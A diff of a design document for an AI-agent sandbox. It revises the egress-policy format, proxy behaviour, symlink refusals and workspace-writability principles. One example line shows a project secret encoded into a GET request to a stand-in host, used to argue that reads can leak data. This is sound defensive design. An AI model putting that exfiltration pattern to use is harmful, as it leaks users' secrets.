@@ -41,15 +41,15 @@ A URL is outbound information. For example:
 GET https://allowed.example/<encoded-project-secret>
 ```
 
-is a write from an information-flow perspective. The read-only tier does not breach this: it
-uses GET/HEAD-only to remove a host's *write API* (SECURITY.md, "Reading without being able to
+is a write from an information-flow perspective. The restricted treatment does not breach this:
+it uses GET/HEAD-only to remove a host's *write API* (SECURITY.md, "Reading without being able to
 write"), never to declare a GET safe — the design principle below ("HTTP \"read\" semantics do
 not make the request an information-flow read") is unchanged by it.
 
 ### No general HTTP method/path policy language
 
 Keep protocol-specific inspection only where it buys a concrete property, as it does for git
-reads versus writes. The read-only tier is the one bounded exception taken: one rule, plus a
+reads versus writes. The restricted treatment is the one bounded exception taken: one rule, plus a
 closed set of tags (`=git-fetch`, `=npm-audit`) each naming a fixed extra allowance — not a
 per-host language. A tag names a rule-set the proxy defines; it never describes one. Its concrete
 property is refusing every allowed host's write surface outside the agent endpoints, the one
@@ -67,8 +67,9 @@ of trying to classify command names as safe.
 
 Style and workflow instructions already have a native per-project channel every agent reads with no
 launcher help: the project's own CLAUDE.md / AGENTS.md / GEMINI.md in the workspace, committed and
-reviewed like any other file. `.ko-agent-sandbox` is mounted read-only because its content governs
-the boundary — a session must not write the egress policy governing the next one — and prose
+reviewed like any other file. `.ko-agent-sandbox` is unwritable in every write mode because its
+content governs the boundary — a session must not write the egress policy governing the next one
+— and prose
 instructions govern nothing enforceable, so the ceremony would protect nothing a hostile repo cannot
 already do through any file in the checkout. The image-side AGENTS.md admits only what a project
 cannot know about itself (the environment, SANDBOX.md) or must not be trusted to declare (the
@@ -77,14 +78,16 @@ STYLE.md and rebuilding.
 
 ### No richer egress-policy format
 
-The policy stays the three fixed lists — a `+host` / `-host` / `-**.domain` delta per tier,
-read-only additions tagged from a closed set (`=git-fetch`, `=npm-audit`), and `blocked` (hosts,
-`**.domain`, `.defaults`) applied last — no fields, no globs beyond the taking-away subtree, no
-ranked rules, no open tag vocabulary. SECURITY.md ("Adding hosts, not patterns") carries the
-reasoning; `resolveTiers` enforces it, tested rule by rule. The failure classes kept out — a
+The policy stays four fixed profiles over two fixed files — `allowed`, a `+host` / `-host` /
+`+model-provider` / `-model-provider` / `.defaults` delta over the launcher-owned baseline with
+treatments and tags from closed sets (`restricted`/`unrestricted`; `=git-fetch`, `=npm-audit`),
+and `denied` (hosts, `**.domain`, provider groups) applied last — no fields, no globs beyond the
+taking-away subtree, no ranked rules, no open tag vocabulary, no selected-provider-plus-extras
+profile variant. SECURITY.md ("Adding hosts, not patterns") carries the reasoning;
+`resolvePolicy` enforces it, tested rule by rule. The failure classes kept out — a
 validator and a runtime reading one configuration differently (one resolver, in the proxy, which
 the launcher's dry run executes), and an allow silently overriding a deny (one fixed order,
-`blocked` last, every contradiction a refusal) — are well attested:
+`denied` last, every contradiction a refusal) — are well attested:
 
 - https://github.com/docker/sbx-releases/issues/410
 - https://github.com/anthropic-experimental/sandbox-runtime/issues/434
@@ -100,7 +103,7 @@ the closed set without a concrete need that outweighs that surface.
 
 Considered: the RFC 9110 shape `OPTIONS * HTTP/1.1` with `Max-Forwards: 0` and a custom query
 header, answering the effective policy from the live proxy. Rejected, because every consumer
-already gets that answer from the proxy's own `--print-policy` dry run — `--proxy-effective`, the
+already gets that answer from the proxy's own `--print-policy` dry run — `--egress-effective`, the
 launch banner, `KO_AGENT_SANDBOX_EGRESS_POLICY`, and the appended agent instructions — and the
 launcher cannot use a live query anyway: the policy must be validated and the leaf minted before
 the proxy container exists, since the leaf is a mount fixed at `podman create`. What the endpoint
@@ -108,7 +111,7 @@ would add is a second parsed request shape at the enforcement point, against its
 CONNECT-only-one-request stance, for information already delivered. `Max-Forwards` itself creates
 no obligation here: it binds a proxy that *forwards* OPTIONS/TRACE, and this one never does —
 non-CONNECT is refused at the proxy layer, both methods are refused inside inspected tunnels, and
-a read-write tunnel is not an HTTP hop at all.
+an unrestricted tunnel is not an HTTP hop at all.
 
 ### No Via header
 
@@ -157,8 +160,8 @@ are compared canonically, so the rule is not one `ln -s` from decorative. Prior 
 
 ### No following symlinks at sandbox setup
 
-A symlinked `.git`, `.git/config`, `.git/hooks`, `.ko-agent-sandbox`, `egress-hosts` or a tier
-file inside it refuses the launch (`gitGuardVolumes`, `policyGuardVolume`, `readPolicyFiles`,
+A symlinked `.git`, `.git/config`, `.git/hooks`, `.ko-agent-sandbox`, `egress` or a policy
+file inside it refuses the launch (`gitGuardVolumes`, `policyDirError`, `readPolicyFiles`,
 tested). Podman resolves mount sources on the host,
 so mounting through a repository-controlled link would expose its target into the sandbox, and
 following the link to pin its resolved target would make the pinned surface depend on where the link
@@ -245,9 +248,11 @@ Do not create a host-side execution path merely to make an agent workflow easier
 ```
 
 ```text
-The writable workspace is untrusted output.
-Protect implicit host execution paths, but keep ordinary project files writable
-because editing them is the purpose of the sandbox.
+The workspace's writability is the user's per-launch authority decision (`--write`).
+In a writable mode, the workspace is untrusted output: protect implicit host execution
+paths, but keep ordinary project files writable, because editing them is the purpose
+of such a session; a read-only session's purpose is reading, and its results leave
+through the conversation.
 ```
 
 ```text
